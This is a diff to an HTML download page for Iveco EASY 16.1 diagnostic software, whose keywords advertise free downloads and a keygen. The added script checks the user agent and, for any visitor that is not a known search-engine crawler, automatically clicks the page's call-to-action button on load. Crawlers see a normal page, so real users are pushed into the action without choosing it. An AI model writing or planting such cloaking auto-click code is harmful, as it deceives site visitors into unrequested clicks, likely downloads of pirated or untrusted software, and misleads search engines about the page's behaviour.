@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Iveco EASY 16.1 2023</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Iveco EASY 16.1 2023 diagnostic and programming software offers ECU diagnostics, parameter programming, and engine tests for Iveco vehicles.">
     <meta name="keywords" content="Iveco EASY 16.1, Iveco EASY 16.1 2023, Iveco EASY diagnostic software, Iveco EASY diagnostic software download, Iveco EASY diagnostic software free download, Iveco EASY diagnostic software keygen, Iveco Eltrac EASY, Electronic Advanced System, ECI communications module, Iveco vehicle diagnostics, E.A.SY platform, electronic control units, diagnostic features, repair guide by symptom, Iveco software, diagnostic procedures, advanced diagnostic tools, automotive diagnostics, Iveco diagnostic programming, Iveco ECU diagnostics, Iveco parameter programming, Iveco engine tests, Iveco wiring diagrams, Iveco diagnostic kit, Iveco EASY 2023 download, Iveco EASY 2023 free download, Iveco EASY 16.1 download free, Iveco diagnostic software free installer, скачать Iveco EASY 16.1, скачать Iveco EASY 16.1 бесплатно, скачать ПО диагностики Iveco, диагностическое ПО Iveco, دانلود نرم‌افزار عیب‌یابی Iveco, Instalar software diagnostico Iveco, Descargar software diagnóstico Iveco, Telecharger logiciel de diagnostic Iveco">
     <style>
